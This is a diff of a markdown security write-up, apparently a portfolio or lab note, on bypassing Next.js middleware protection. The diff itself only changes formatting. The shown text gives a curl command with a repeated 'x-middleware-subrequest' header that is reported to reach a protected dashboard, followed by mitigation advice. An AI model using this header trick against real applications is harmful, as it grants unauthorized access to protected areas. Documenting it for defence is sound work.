@@ -17,6 +17,7 @@ Bypass Next.js middleware protection to access restricted application areas.
 
 ```bash
 curl https://target/dashboard
+
 # Returns: Redirect to login or access denied
 Exploit Technique:
 
@@ -24,7 +25,7 @@ bash
 curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" https://target/dashboard
 Result: Successfully bypassed middleware protection, accessed protected dashboard
 
-🛡️ Mitigation Strategies
+## 🛡️ Mitigation Strategies
 Framework Updates: Immediate update to patched Next.js versions
 
 Header Validation: Implement strict validation for all incoming headers
@@ -33,7 +34,7 @@ Defense in Depth: Additional authentication checks beyond middleware
 
 Security Testing: Regular vulnerability scanning for framework-specific issues
 
-📊 Skills Demonstrated
+## 📊 Skills Demonstrated
 Framework Security: Understanding Next.js middleware architecture
 
 Header Manipulation: Exploiting improper HTTP header processing
